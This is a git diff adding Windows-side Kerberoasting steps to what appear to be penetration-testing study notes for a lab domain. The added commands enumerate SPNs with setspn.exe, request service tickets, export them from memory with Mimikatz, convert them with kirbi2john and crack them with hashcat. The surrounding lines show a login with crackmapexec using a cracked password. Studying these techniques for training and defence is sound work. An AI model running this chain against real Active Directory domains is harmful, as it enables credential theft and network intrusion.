@@ -800,3 +800,43 @@ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
 ```shell
 sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
 ```
+### from Windows
+
+#### Enumerating SPNs and request tickets with setspn.exe
+
+```powershell
+# Enumerating SPNs
+setspn.exe -Q */*
+
+# Targeting a Single User Ticket
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+
+# Retrieving All Tickets Using setspn.exe
+setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+```
+
+#### Extracting Tickets from Memory with Mimikatz
+after requesting the tickets using `setspn.exe` now we need to extract it 
+``` powershell
+# extract tickets as .kirbi
+.\mimikatz.exe  "kerberos::list /export" "exit"
+
+# extract tickets as base64
+.\mimikatz.exe "base64 /out:true" "kerberos::list /export" "exit"
+
+# Preparing the Base64 Blob for Cracking
+echo "<base64 blob>" |  tr -d \\n 
+
+# Placing the Output into a File as .kirbi
+cat encoded_file | base64 -d > sqldev.kirbi
+
+# Extracting the Kerberos Ticket using kirbi2john.py (This will create a file called crack_file)
+kirbi2john sqldev.kirbi
+
+# Modifiying crack_file for Hashcat
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
+
+# Cracking the Hash with Hashcat
+hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
+```
